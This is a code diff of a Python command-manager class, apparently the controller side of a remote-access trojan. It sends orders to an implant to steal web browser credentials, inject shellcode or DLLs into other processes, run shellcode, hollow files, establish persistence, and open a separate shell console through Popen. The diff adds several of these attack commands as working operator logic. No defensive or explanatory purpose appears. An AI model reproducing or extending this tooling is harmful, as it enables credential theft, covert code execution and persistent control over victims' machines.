@@ -1,52 +1,97 @@
 from Tools.toolsF import *
+from Tools.comandInfo import *
+from os import getcwd
+from subprocess import Popen, DEVNULL
+from os.path import join as pathJoin
 import json
+import re
+
 
 
 
 class CommandManager(object):
 
-    def __init__(self,writer, reader):
+    def __init__(self, writer, reader):
         self.writer = writer
         self.reader = reader
+        self.id = id
         self.waitingForResult = False
         self.tag = "root"
      
-    def retriveCommand(self, message:dict):
-        command = message.get("command")
+    def retriveCommand(self, message:dict, getcd=False):
+        command = message.get("message").get("command")
         self.waitingForResult = command is not None and len(command) > 0
         if not self.waitingForResult: 
             return
-        if command == "5df297c2f2da83a8b45cfd012fbf9b3c": #Web passwords
+        
+        if command == WEB_CREDENTIALS:
             command = gen_xml(self.tag, command=command, type=message.get("type"),web=message.get("web")) 
             self.writer(command.encode())
             return collect(json.loads(self.reader().decode(errors='replace')))
-        if command == "be425fd08e9ea24230bac47493228ada": #List process Info
+        
+        if command == LIST_PROCESS_INFORMATION:
             self.writer(gen_xml(self.tag, command=command).encode())
             return json.loads(self.reader().decode(errors='replace'))
-        if command == "aea87b24517d08c8ff13601406a0202e": #Inject a process
+        
+        if command == INJECT_PROCESS_SHELLCODE:
             self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase"), targetPid=message.get("targetPid")).encode())
             status = str(self.reader().decode(errors='replace').strip())
             return tryParse(int, status ,1) == 0
-        if command == "2dbab3bcba2fe64f1d2133bc50796496": #Run local shell code
+        
+        if command == RUN_LOCAL_SHELLCODE:
             self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase")).encode())
             status = self.reader().decode(errors='replace').strip()
             return tryParse(int, status, 1) == 0
-        if command == "e5fcfe07178a109ea0c1e9bd7e9dd772": #Persistence
+        
+        if command == PERSITENCE:
             self.writer(gen_xml(self.tag, **message).encode())
             status = self.reader().decode(errors='replace').strip()
             return tryParse(int, status, 1) == 0
-        if command == "ce52e112fb976b2d277f09b6eada379f": #Get files table for hollow
+        
+        if command == FILES_SNAP_FULL:
             self.writer(gen_xml(self.tag, **message).encode())
-            print("end Processing hollowing")
             return json.loads(self.reader().decode(errors='replace'))
-        if command == "b11c081208b1d6466c83e37098510d73": #Hollow File
+        
+        if command == HOLLOW_FILE_EXEC:
             self.writer(gen_xml(self.tag, **message).encode())
             status = self.reader().decode(errors='replace').strip()
             return tryParse(int, status, 1) == 0
+        
+        if command == DLL_INJECT:
+            self.writer(gen_xml(self.tag, **message).encode())
+            status = self.reader().decode(errors='replace').strip()
+            return tryParse(int, status, 1) == 0
+        
+        if command == CREAT_SEPARATED_CONSOLE:
+            internalClientPath = pathJoin(getcwd(), "Tools", "internalClient.py")
+            execute = EXECUTE_INTERNAL_CLIENT.format(
+                internalClientPath, 
+                "local", 
+                message.get("id").strip()
+            )
+            print(execute)
+            Popen(execute, shell=True, stdout=DEVNULL, stderr=DEVNULL)
+            return
+        
+        if command.startswith(CHANGE_CWD):
+            matchcd = re.match(CHANGE_CWD_PATTERN, command)
+            _, path = matchcd.groups()
+            command = gen_xml(self.tag, command=CHANGE_CWD, path=path.strip())
+            self.writer(command.encode())
+            return self.reader().decode(errors='replace')
 
-        command = gen_xml(self.tag, command=command)
+        if getcd:
+            command = gen_xml(self.tag, command=command, getcd="true")
+        else:
+            command = gen_xml(self.tag, command=command)
         self.writer(command.encode())
         return self.reader().decode(errors='replace')
+    
+    def _alterRetriveCommand(self,command):
+        message = {
+            'message': {'command': command} 
+        }
+        return self.retriveCommand(message, getcd=True)
         
     def isValid(self,*args) -> bool:
         for i in args:
